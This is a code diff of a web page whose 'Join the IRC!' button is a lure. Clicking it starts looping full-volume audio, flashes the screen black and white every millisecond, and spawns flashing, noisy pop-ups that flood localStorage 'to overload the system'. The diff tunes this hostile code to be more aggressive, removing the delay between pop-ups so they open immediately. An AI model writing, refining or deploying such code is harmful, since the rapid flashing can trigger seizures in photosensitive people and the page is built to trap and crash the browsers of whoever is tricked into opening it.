@@ -14,7 +14,7 @@
 <body>
 
     <!-- Button to trigger the pop-ups, sound, and flashing colors -->
-    <button onclick="startEffect()">Join the chatroom!</button>
+    <button onclick="startEffect()">Join the IRC!</button>
 
     <audio id="audioPlayer" loop>
         <source src="aaa.mp3" type="audio/mp3">
@@ -35,12 +35,12 @@
             // Flash the main page background white and black ultra fast
             setInterval(function() {
                 document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
-            }, 0.00001); // Flash every ultra-fast interval
+            }, 1); // Flash every 1ms (ultra-fast)
         }
 
         function createPopups(count) {
-            // Open pop-ups sequentially to prevent being blocked by the browser
             let popupIndex = 0;
+
             function openNextPopup() {
                 if (popupIndex < count) {
                     let popup = window.open('', '', 'width=300,height=200');
@@ -65,15 +65,15 @@
                             </html>
                         `);
 
-                        // Play audio in the pop-up
+                        // Start the audio in the pop-up
                         let popupAudio = popup.document.getElementById('audio');
                         popupAudio.volume = 1; // Set the audio volume to full
                         popupAudio.play(); // Start playing the audio
-                        
-                        // Flash random background color in the pop-up ultra fast
+
+                        // Flash random background color in the pop-up ultra fast (1ms)
                         setInterval(function() {
                             popup.document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
-                        }, 0.00001); // Flash every ultra-fast interval
+                        }, 1); // Flash every 1ms
 
                         // Manipulate local storage to overload the system
                         for (let i = 0; i < 10000; i++) {
@@ -81,10 +81,11 @@
                         }
 
                         popupIndex++;
-                        setTimeout(openNextPopup, 1); // Open the next pop-up every millisecond to avoid blocking
+                        openNextPopup(); // Open the next pop-up immediately (no delay)
                     }
                 }
             }
+
             openNextPopup(); // Start opening pop-ups
         }
 
